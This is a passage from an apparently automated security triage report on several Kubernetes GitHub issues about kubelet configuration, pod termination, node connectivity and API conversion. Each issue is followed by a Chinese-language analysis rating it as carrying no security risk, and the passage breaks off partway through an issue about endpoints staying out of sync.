I created a kubernetes cluster with kubeadm and created a drop-in directory for kubelet configuration at `/etc/kubernetes/kubelet.conf.d`.

I created a config file within the directory to change the value of `resolvConf`. After restarting kubelet, the value of `resolvConf` stayed same.

#### What did you expect to happen?

The value of `resolvConf` is updated.

#### How can we reproduce it (as minimally and precisely as possible)?

```sh
# Create custom resolv.conf
echo 'nameserver 8.8.8.8' | sudo tee /etc/resolv.kubelet.conf

# Create drop-in config directory
sudo mkdir /etc/kubernetes/kubelet.conf.d
sudo chmod 700 /etc/kubernetes/kubelet.conf.d

# Create drop-in config file
cat <<EOF | sudo tee /etc/kubernetes/kubelet.conf.d/99-resolv-conf.conf
apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
resolvConf: /etc/resolv.kubelet.conf
EOF
sudo chmod 600 /etc/kubernetes/kubelet.conf.d/99-resolv-conf.conf

# Add --config-dir flag
echo 'KUBELET_EXTRA_ARGS=--config-dir=/etc/kubernetes/kubelet.conf.d' | sudo tee /etc/default/kubelet

sudo systemctl daemon-reload
sudo systemctl restart kubelet

# Check if the value of resolvConf is changed.
kubectl get --raw "/api/v1/nodes/<node name>/proxy/configz" | jq
```

#### Anything else we need to know?

I think this issue is particular to the drop-in config and `resolvConf` option because:

- I can configure `resolvConf` by editing `/var/lib/kubelet/config.yaml`
- I can update another option like `streamingConnectionIdleTimeout` with drop-in config.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.3
```

</details>


#### Cloud provider

<details>
No cloud provider
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
$ uname -a
Linux vm-1aefb131-31 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue涉及到在使用kubeadm创建的Kubernetes集群中，通过在`/etc/kubernetes/kubelet.conf.d`目录下创建drop-in配置文件来修改kubelet的`resolvConf`配置。然而，重启kubelet后，`resolvConf`的值并未更新。

根据风险判断标准：
1. 该问题属于配置问题，没有提及任何可能被攻击者利用的漏洞或安全风险。
2. 此问题不会成为一个漏洞，不会被分配CVE编号，按照CVSS 3.1评分标准也不会达到High级别。
3. Issue提交者未在内容中暴露敏感信息或存在不当操作。
4. 不涉及拒绝服务（DoS）攻击。
5. 未提及凭据泄露等高风险情况。
6. 因此，该Issue不涉及安全问题。

---

## Issue #126616 [FG:InPlacePodVerticalScaling] Change in version-skewed behavior in v1.31

- Issue 链接：[#126616](https://github.com/kubernetes/kubernetes/issues/126616)

### Issue 内容

For features that span nodes & control planes, they must support the case where the feature is enabled in the control plane but not on nodes, in order to support version skew after the feature is promoted to a default-on state.

Previously, the node/control-plane skewed behavior of `InPlacePodVerticalScaling` was to sort of support the resize by restarting the resized container. The API is eventually consistent with the running container.

1. Someone / something updates pod resources on a running pod
2. apiserver has the feature gate enabled, so it accepts the request and sets the resize status to pending
3. Kubelet sees a change in the hash and restarts the container, with the new resource amount
4. Kubelet patches the status, but doesn't set the resize status (and doesn't copy it from the old status), thus clearing it

In v1.31 the hashing logic was changed to avoid accidental container restarts: https://github.com/kubernetes/kubernetes/pull/124220. However, this also prevents the Kubelet from seeing the changed resources in step 3, so the container is not restarted with the new resource value. If the container is restarted for any other reason, it will be restarted with the new resource value. There is no way to tell from the API which value the container is using.

The previous behavior is consistent with the skew handling described in the KEP, except this part was never implemented:
> kubelet: When feature-gate is disabled, if kubelet sees a Proposed resize, it rejects the resize as Infeasible.

This is a regression, but shouldn't be release blocking as it is only triggered when the alpha feature is enabled.

/kind bug
/kind regression
/milestone v1.31
/sig node
/priority important-longterm

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue描述了Kubernetes在v1.31版本中的一个关于`InPlacePodVerticalScaling`特性的行为变更。当控制平面启用了该特性，而节点上的kubelet未启用该特性（可能由于版本差异），在v1.31之前，当更新运行中Pod的资源时，kubelet会检测到哈希值变化，并重启容器以应用新的资源配置。然而，在v1.31版本中，由于为了避免意外的容器重启，更改了哈希逻辑，导致kubelet无法检测到资源的变化，因此容器不会立即使用新的资源配置。

该问题导致了API和实际运行状态之间的不一致，即API认为容器应该使用新的资源配置，但容器实际上仍在使用旧的资源配置。虽然这可能会造成一定的管理混乱或资源分配上的不一致，但该Issue中并未提及任何可能导致安全风险的情况。

**根据风险判断标准：**

1. **攻击者利用性：** 该问题需要攻击者具备更新Pod资源的权限，即需要具备创建或修改等非只读权限，普通用户无法利用。

2. **风险等级：** 该问题不会导致命令执行、容器逃逸、提权等高安全风险，也不会导致凭据泄露，符合标准中对低风险或不涉及的描述。

3. **影响范围：** 问题仅在启用了alpha特性的情况下触发，影响范围有限，并且需要特定的版本和配置组合。

因此，综合以上因素，判断该Issue不涉及安全风险。

---

## Issue #126607 Pod Stuck In Terminating State After Kublet Restart

- Issue 链接：[#126607](https://github.com/kubernetes/kubernetes/issues/126607)

### Issue 内容

#### What happened?

A node in our GKE cluster was experiencing an extremely heavy load during load testing.

CNI pods (calico) and CSI pods crashed several times as well as the kubelet and caused the following.

```
INFO 2024-07-23T02:33:56.075736Z "Updating ready status of pod to false" pod="performance-citus/mirror-citus-shard0-0"
WARNING 2024-07-23T02:33:56Z Node is not ready
INFO 2024-07-23T02:39:01Z Marking for deletion Pod performance-citus/mirror-citus-shard0-0
DEFAULT 2024-07-23T02:33:56.178205Z audit_log, method: "io.k8s.discovery.v1.endpointslices.update", principal_email: "system:serviceaccount:kube-system:endpointslice-controller"
DEFAULT 2024-07-23T02:33:56.177543Z audit_log, method: "io.k8s.core.v1.endpoints.update", principal_email: "system:serviceaccount:kube-system:endpoint-controller"
INFO 2024-07-23T02:33:56.165537Z "Event occurred" object="performance-citus/mirror-citus-shard0-0" fieldPath="" kind="Pod" apiVersion="v1" type="Warning" reason="NodeNotReady" message="Node is not ready"
```

While the kublet was down, I believe a 3rd party operator(stackgres - which manages mirror-citus-shard0-0) attempted to delete the pod
```
INFO 2024-07-23T02:39:01.404541Z "HTTP" verb="DELETE" URI="/api/v1/namespaces/performance-citus/pods/mirror-citus-shard0-0" latency="23.911565ms" userAgent="kube-controller-manager/v1.29.6 (linux/amd64) kubernetes/7466e0b/system:serviceaccount:kube-system:node-controller" audit-ID="48eb34a8-c904-452c-9d24-e265c5b9b555" srcIP="172.16.0.4:44026" apf_pl="workload-high" apf_fs="kube-system-service-accounts" apf_iseats=1 apf_fseats=2 apf_additionalLatency="5ms" apf_execution_time="21.683835ms" resp=200
```

The kublet started back up
```
DEFAULT 2024-07-23T02:40:46.695093Z I0723 02:40:46.695068 1907 server.go:1256] "Started kubelet"
```

And then got the following events:
```
DEFAULT 2024-07-23T02:41:29.716685Z I0723 02:41:29.716630 1907 util.go:48] "No ready sandbox for pod can be found. Need to start a new one" pod="performance-citus/mirror-citus-shard0-0"
DEFAULT 2024-07-23T02:41:29.827338Z I0723 02:41:29.827304 1907 kubelet.go:2431] "SyncLoop DELETE" source="api" pods=["performance-citus/mirror-citus-shard0-0"]
INFO 2024-07-23T02:41:29.974546Z "Delete event for scheduled pod" pod="performance-citus/mirror-citus-shard0-0"
INFO 2024-07-23T02:41:29.973757Z "Delete event for scheduled pod" pod="performance-citus/mirror-citus-shard0-0"
INFO 2024-07-23T02:41:29.971246Z "Delete event for scheduled pod" pod="performance-citus/mirror-citus-shard0-0"
INFO 2024-07-23T02:41:33.490122527Z [background-id:f866480ddd35e7aa pod:performance-citus/mirror-citus-shard0-0] Pod not found
```

Also at this time, the csi driver (openebs zfs local pv) pod also restarted
```
DEFAULT 2024-07-23T02:40:59.843466Z I0723 02:40:59.843471 1907 kubelet.go:2447] "SyncLoop (PLEG): event for pod" pod="common/mirror-zfs-localpv-node-nlcwh" event={"ID":"565886d5-330a-4315-ab51-e4090e4faa81","Type":"ContainerDied","Data":"963386a20eb25eb4d10c9a35b20569b11c90d9da8902707a1b4dfaf4353964da"}
DEFAULT 2024-07-23T02:41:00.849481Z I0723 02:41:00.849355 1907 kubelet.go:2447] "SyncLoop (PLEG): event for pod" pod="common/mirror-zfs-localpv-node-nlcwh" event={"ID":"565886d5-330a-4315-ab51-e4090e4faa81","Type":"ContainerStarted","Data":"0bd24b519c769d49741aa3aa47946c26b3d75c5b536a9ec39a892aa16b0cba29"}
```

After the driver started, it attempted  to publish the node volume.
```
INFO 2024-07-23T02:41:20.552995067Z GRPC call: /csi.v1.Node/NodePublishVolume requests {"target_path":"/var/lib/kubelet/pods/f3e6dda8-df2a-464a-9b77-f72225bcbd52/volumes/kubernetes.io~csi/pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c/mount","volume_capability":{"AccessType":{"Mount":{"fs_type":"zfs"}},"access_mode":{"mode":1}},"volume_context":{"openebs.io/cas-type":"localpv-zfs","openebs.io/poolname":"zfspv-pool","storage.kubernetes.io/csiProvisionerIdentity":"1711133401917-1665-zfs.csi.openebs.io"},"volume_id":"pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c"}
ERROR 2024-07-23T02:41:20.565802524Z GRPC error: rpc error: code = Internal desc = zfs get mountpoint failed, cannot open 'zfspv-pool/pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c': dataset does not exist
ERROR 2024-07-23T02:41:20.565768826Z zfs: could not get mountpoint on dataset zfspv-pool/pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c cmd [get -pH -o value mountpoint zfspv-pool/pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c] error: cannot open 'zfspv-pool/pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c': dataset does not exist
```

This publish failed but the kubelet logged a successful mount:
```
DEFAULT 2024-07-23T02:41:20.549581Z I0723 02:41:20.549480 1907 operation_generator.go:664] "MountVolume.MountDevice succeeded for volume \"pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c\" (UniqueName: \"kubernetes.io/csi/zfs.csi.openebs.io^pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c\") pod \"mirror-citus-shard0-0\" (UID: \"f3e6dda8-df2a-464a-9b77-f72225bcbd52\") device mount path \"/var/lib/kubelet/plugins/kubernetes.io/csi/zfs.csi.openebs.io/ba33a2244c475d064d33ba6b1934dd720ee89fd2e931120ee8ee6af1e612d16d/globalmount\"" pod="performance-citus/mirror-citus-shard0-0"
```

A few milliseconds later I see this from the kubet logs
```
DEFAULT 2024-07-23T02:41:20.566467Z E0723 02:41:20.566432 1907 nestedpendingoperations.go:348] Operation for "{volumeName:kubernetes.io/csi/zfs.csi.openebs.io^pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c podName: nodeName:}" failed. No retries permitted until 2024-07-23 02:41:52.566409131 +0000 UTC m=+65.995713484 (durationBeforeRetry 32s). Error: MountVolume.SetUp failed for volume "pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c" (UniqueName: "kubernetes.io/csi/zfs.csi.openebs.io^pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c") pod "mirror-citus-shard0-0" (UID: "f3e6dda8-df2a-464a-9b77-f72225bcbd52") : rpc error: code = Internal desc = zfs get mountpoint failed, cannot open 'zfspv-pool/pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c': dataset does not exist
```

The zfs csi driver had not yet synced the dataset but did so here
```
INFO 2024-07-23T02:42:22.346842379Z Successfully synced 'common/pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c'
```

However, the mount request has already happened and also the pod was attempted to be deleted above and stuck because the volume couldn't unmount. This log has been flooding logs ever since
```
E0723 02:41:30.012618    1907 reconciler_common.go:169] "operationExecutor.UnmountVolume failed (controllerAttachDetachEnabled true) for volume \"pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c\" (UniqueName: \"kubernetes.io/csi/zfs.csi.openebs.io^pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c\") pod \"f3e6dda8-df2a-464a-9b77-f72225bcbd52\" (UID: \"f3e6dda8-df2a-464a-9b77-f72225bcbd52\") : UnmountVolume.NewUnmounter failed for volume \"pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c\" (UniqueName: \"kubernetes.io/csi/zfs.csi.openebs.io^pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c\") pod \"f3e6dda8-df2a-464a-9b77-f72225bcbd52\" (UID: \"f3e6dda8-df2a-464a-9b77-f72225bcbd52\") : kubernetes.io/csi: unmounter failed to load volume data file [/var/lib/kubelet/pods/f3e6dda8-df2a-464a-9b77-f72225bcbd52/volumes/kubernetes.io~csi/pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c/mount]: kubernetes.io/csi: failed to open volume data file [/var/lib/kubelet/pods/f3e6dda8-df2a-464a-9b77-f72225bcbd52/volumes/kubernetes.io~csi/pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c/vol_data.json]: open /var/lib/kubelet/pods/f3e6dda8-df2a-464a-9b77-f72225bcbd52/volumes/kubernetes.io~csi/pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c/vol_data.json: no such file or directory" err="UnmountVolume.NewUnmounter failed for volume \"pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c\" (UniqueName: \"kubernetes.io/csi/zfs.csi.openebs.io^pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c\") pod \"f3e6dda8-df2a-464a-9b77-f72225bcbd52\" (UID: \"f3e6dda8-df2a-464a-9b77-f72225bcbd52\") : kubernetes.io/csi: unmounter failed to load volume data file [/var/lib/kubelet/pods/f3e6dda8-df2a-464a-9b77-f72225bcbd52/volumes/kubernetes.io~csi/pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c/mount]: kubernetes.io/csi: failed to open volume data file [/var/lib/kubelet/pods/f3e6dda8-df2a-464a-9b77-f72225bcbd52/volumes/kubernetes.io~csi/pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c/vol_data.json]: open /var/lib/kubelet/pods/f3e6dda8-df2a-464a-9b77-f72225bcbd52/volumes/kubernetes.io~csi/pvc-09c95a39-cf08-4035-9f2e-2bef87ec738c/vol_data.json: no such file or directory"
```


#### What did you expect to happen?

The volume to be unmounted or if not present/already unmounted, the failed unmount that will never succeed (due to the missing file) should not block the pod from terminating

#### How can we reproduce it (as minimally and precisely as possible)?

Don't really have steps to reproduce

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.29.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.6-gke.1038001
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd github.com/containerd/containerd 1.7.13-0ubuntu0~22.04.1~gke1
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
calico, openebs zfs local-pv
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue描述了在GKE集群中，一个节点由于负载过重导致kubelet和CNI、CSI等组件崩溃，重启后出现了Pod无法删除，卡在Terminating状态的问题。日志显示卷的卸载失败，导致Pod无法正常终止。

这个问题是由于系统在高负载情况下，组件重启导致资源未能正确清理，引起了Pod无法删除的现象。整个过程中，没有涉及到任何安全风险，没有证据表明攻击者可以利用此问题进行攻击，也没有涉及权限提升、命令执行、容器逃逸等高风险安全问题。

因此，综合判断，该Issue不涉及安全风险。

---

## Issue #126598 Unable to access control plane after Kubernetes worker node reboot

- Issue 链接：[#126598](https://github.com/kubernetes/kubernetes/issues/126598)

### Issue 内容

#### What happened?

After running the kubectl drain master-1 --ignore-daemonsets command, I rebooted the node. (The node's name is master-1, but it's actually a worker node.) After rebooting, I ran kubectl describe node master-1 and was able to confirm the following.

```
NetworkUnavailable False Thu, 08 Aug 2024 13:03:33 +0900 Thu, 08 Aug 2024 13:03:33 +0900 CalicoIsUp Calico is running on this node
MemoryPressure Unknown Fri, 09 Aug 2024 00:24:51 +0900 Fri, 09 Aug 2024 00:28:34 +0900 NodeStatusUnknown Kubelet stopped posting node status. DiskPressure Unknown Fri, 09 Aug 2024 00:24:51 +0900 Fri, 09 Aug 2024 00:28:34 +0900 NodeStatusUnknown Kubelet stopped posting node status.
 PIDPressure Unknown Fri, 09 Aug 2024 00:24:51 +0900 Fri, 09 Aug 2024 00:28:34 +0900 NodeStatusUnknown Kubelet stopped posting node status.
 Ready Unknown Fri, 09 Aug 2024 00:24:51 +0900 Fri, 09 Aug 2024 00:28:34 +0900 NodeStatusUnknown Kubelet stopped posting node status.

```
After that, I tried sudo service kubelet restart, but the status above did not change, so I ran journalctl -xeu kubelet and was able to see the following log.

`Aug 09 00:53:43 master-1 kubelet[4037]: E0809 00:53:43.977693 4037 event.go:368] "Unable to write event (may retry after sleeping)" err="Post \"https://172.30.1.25:6443/api/v1/namespaces/default/events\": dial tc p 172.30.1.25:6443: connect: connection refused" event="&Event{ObjectMeta:{master-1.17e9cb4b4ae2670b default 0 0001-01-01 00:00:00 +0000 UTC <> Aug 09 00:53:44 master-1 kubelet[4037]: W0809 00:53:44.689016 4037 reflector.go:547] k8s.io/client-go/informers/factory.go:160: failed to list *v1.Service: Get "https://172.30.1.25:6443/api/v1/services?limit=500&resourceVersion=0": dial tcp 172.30.1.2 5:6443: connect: connection refused Aug 09 00:53:44 master-1 kubelet[4037]: E0809 00:53:44.689188 4037 reflector.go:150] k8s.io/client-go/informers/factory.go:160: Failed to watch *v1.Service: failed to list *v1.Service: Get "https://172.30.1.25:6443/api/v1/services?limit=500&resourceVersion=0": dial tcp 172.30.1.25:6443: connect: connection refused Aug 09 00:53:46 master-1 kubelet[4037]: E0809 00:53:46.719516 4037 eviction_manager.go:282] "Eviction manager: failed to get summary stats" err="failed to get node info: node \"master-1\" not found" Aug 09 00:53:49 master-1 kubelet[4037]: E0809 00:53:49.431097 4037 controller.go:145] "Failed to ensure lease exists, will retry" err="Get \"https://172.30.1.25:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master-1?timeout=10s\": dial tcp 172.30.1.25:6443: connect: connection refused" interval="7s" Aug 09 00:53:49 master- 1 kubelet[4037]: I0809 00:53:49.796996 4037 kubelet_node_status.go:73] "Attempting to register node" node="master-1" Aug 09 00:53:49 master-1 kubelet[4037]: E0809 00:53:49.800718 4037 kubelet_node_status.go:96] "Unable to register node with API server" err="Post \"https://172.30.1.25:6443/api/v1/nodes\": dial tcp 172.30.1.25:6443: connect: connection refused" node="master-1"
`
The strange thing is that when I ran curl https://172.30.1.25:6443 --insecure on other worker nodes and the master node, I got a 403 error, but when I ran the above command on the node that had been rebooted, I got the following output.

`curl: (7) Failed to connect to 172.30.1.25 port 6443 after 0 ms: Couldn't connect to server`

The actual master node ip is 172.30.1.4, and 172.30.1.25 is an address exposed through HAProxy and Keepalived on a separate load balancer node. Could this be the issue?
Or did I do something wrong during the node reboot process?

#### What did you expect to happen?

When this happened previously, the solution was to reset the entire cluster.

#### How can we reproduce it (as minimally and precisely as possible)?

sudo kubeadm init --pod-network-cidr=192.168.0.0/16 --upload-certs --control-plane-endpoint=172.30.1.25:6443
After running the above command, add the worker node using the kubeadm join command. After installing calico and metallb, the above-described thing happened.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.3
```

</details>


#### Cloud provider

<details>
self hosted ubuntu 24 server
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo
$ uname -a
Linux master-1 6.8.0-39-generic #39-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul  5 21:49:14 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd containerd.io 1.7.19
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
calico v3.28.1
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了用户在重启Kubernetes工作节点后，无法访问控制平面的问题。从日志信息和描述来看，问题的原因可能是节点无法连接到API服务器，导致kubelet无法正常工作。这似乎是由于网络连接或配置问题导致的。没有任何迹象表明存在可被攻击者利用的安全漏洞，也没有涉及到敏感信息泄露或高风险的安全问题。根据风险判断标准，此Issue不涉及安全风险。

---

## Issue #126587 CVE PLACEHOLDER ISSUE

- Issue 链接：[#126587](https://github.com/kubernetes/kubernetes/issues/126587)

### Issue 内容

/triage accepted
/lifecycle frozen
/area security
/kind bug
/committee security-response

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，标题为“CVE PLACEHOLDER ISSUE”，内容仅包含了一些标签指令，如`/triage accepted`、`/lifecycle frozen`、`/area security`等。这些内容没有提供具体的技术细节或安全漏洞的信息。根据风险判断标准第6条：“如果Issue不涉及安全问题，则风险评级判断为不涉及”。因此，该Issue不涉及安全风险。

---

## Issue #126584 When setting kubeReserved non-provided values should fallback to config

- Issue 链接：[#126584](https://github.com/kubernetes/kubernetes/issues/126584)

### Issue 内容

#### What happened?

Kubelet fails to start due to invalid KubeReserved


#### What did you expect to happen?

cpu and ephemeral-storage to be configured for kubeReserved

#### How can we reproduce it (as minimally and precisely as possible)?

Start kubelet with KUBELET_EXTRA_ARGS='--kube-reserved="memory=1355Mi"' and  /etc/kubernetes/kubelet/kubelet-config.json  with kubeReserved set:
```
{
  "kind": "KubeletConfiguration",
  "apiVersion": "kubelet.config.k8s.io/v1beta1",
  "address": "0.0.0.0",
  "authentication": {
    "anonymous": {
      "enabled": false
    },
    "webhook": {
      "cacheTTL": "2m0s",
      "enabled": true
    },
    "x509": {
      "clientCAFile": "/etc/kubernetes/pki/ca.crt"
    }
  },
  "authorization": {
    "mode": "Webhook",
    "webhook": {
      "cacheAuthorizedTTL": "5m0s",
      "cacheUnauthorizedTTL": "30s"
    }
  },
  "clusterDomain": "cluster.local",
  "hairpinMode": "hairpin-veth",
  "cgroupDriver": "cgroupfs",
  "cgroupRoot": "/",
  "featureGates": {
    "RotateKubeletServerCertificate": true
  },
  "serializeImagePulls": false,
  "serverTLSBootstrap": true,
  "tlsCipherSuites": [
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_RSA_WITH_AES_128_GCM_SHA256"
  ],
  "evictionHard": {
    "memory.available": "100Mi",
    "nodefs.available": "10%",
    "nodefs.inodesFree": "5%"
  },
  "kubeReserved": {
    "cpu": "90m",
    "ephemeral-storage": "1Gi",
    "memory": "893Mi"
  }
}
```

#### Anything else we need to know?

Via cli flag and KUBELET_EXTRA_ARGS I'm setting KubeReserved memory and would like cpu and ephemeral-storage to be read from config file.

#### Kubernetes version

<details>

```console
$ kubectl version
1.28
```

</details>


#### Cloud provider

AWS EKS


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，该问题涉及到Kubelet在配置`kubeReserved`时，由于命令行参数和配置文件的设置导致无法启动。具体来说，用户通过命令行参数设置了`kubeReserved`的内存（`memory=1355Mi`），并希望CPU和临时存储（`ephemeral-storage`）的配置能够从配置文件中读取。但这种部分通过命令行参数，部分通过配置文件的混合配置方式导致了Kubelet启动失败。

此问题属于配置不当引起的功能性错误，并未涉及任何安全漏洞或安全风险。根据风险判断标准第6条：“如果Issue不涉及安全问题，则风险评级判断为不涉及”。因此，该Issue不涉及安全风险。

---

## Issue #126582 Using runtime scheme.Convert for Validating Admission Policy version conversion results in error

- Issue 链接：[#126582](https://github.com/kubernetes/kubernetes/issues/126582)

### Issue 内容

#### What happened?

Converting `v1beta1.ValidatingAdmissionPolicy` to `v1.ValidatingAdmissionPolicy` and `v1beta1.ValidatingAdmissionPolicyBinding` to `v1.ValidatingAdmissionPolicyBinding` using [runtime#Scheme.Convert](https://pkg.go.dev/k8s.io/apimachinery@v0.30.3/pkg/runtime#Scheme.Convert), results below errors - 

- `converting (v1beta1.ValidatingAdmissionPolicy) to (v1.ValidatingAdmissionPolicy): unknown conversion`

- `converting (v1beta1.ValidatingAdmissionPolicyBinding) to (v1.ValidatingAdmissionPolicyBinding): unknown conversion`

#### What did you expect to happen?

`scheme.Convert` should convert the validating admission policy and validating admission policy binding resource to respective `v1` versions.

#### How can we reproduce it (as minimally and precisely as possible)?

- Construct a `v1beta1` versioned ValidatingAdmissionPolicy or ValidatingAdmissionPolicyBinding object through go-client.
- Use `runtime#Scheme.Convert()` to convert the object to `v1` versioned Validating Admission Policy.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

$ uname -a
# paste output here
Linux <user-name> 5.15.0-1068-azure #77~20.04.1-Ubuntu SMP Fri Jun 21 22:05:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过对Issue的分析，该问题描述了在使用`runtime#Scheme.Convert`将`v1beta1.ValidatingAdmissionPolicy`转换为`v1.ValidatingAdmissionPolicy`以及将`v1beta1.ValidatingAdmissionPolicyBinding`转换为`v1.ValidatingAdmissionPolicyBinding`时，出现了`unknown conversion`的错误。这是一个涉及Kubernetes API版本转换的问题，属于功能性错误。

根据风险判断标准：

1. **该风险能被攻击者利用**：该问题并不会被攻击者利用，因为它仅涉及到开发者在使用API时遇到的版本转换错误。

2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：该问题不涉及安全漏洞，不会被分配CVE编号，风险评级也不会达到high以上。

6. **如果Issue不涉及安全问题，则风险评级判断为不涉及**：此Issue属于功能性问题，不涉及安全风险。

综上所述，该Issue不涉及安全风险。

---

## Issue #126578 Still seeing the issue for endpoints staying out of sync

- Issue 链接：[#126578](https://github.com/kubernetes/kubernetes/issues/126578)

### Issue 内容

#### What happened?

This issue https://github.com/kubernetes/kubernetes/issues/125638 was supposed to have fixed the issue where endpoint stay out of sync 
```
I0807 14:01:51.613700       2 endpoints_controller.go:348] "Error syncing endpoints, retrying" service="test1/test-qa" err="endpoints informer cache is out of date, resource version 10168236546 already processed for endpoints test1/test-qa"
I0807 14:01:51.624576       2 endpoints_controller.go:348] "Error syncing endpoints, retrying" service="test1/test-qa" err="endpoints informer cache is out of date, resource version 10168236546 already processed for endpoints test1/test-qa"
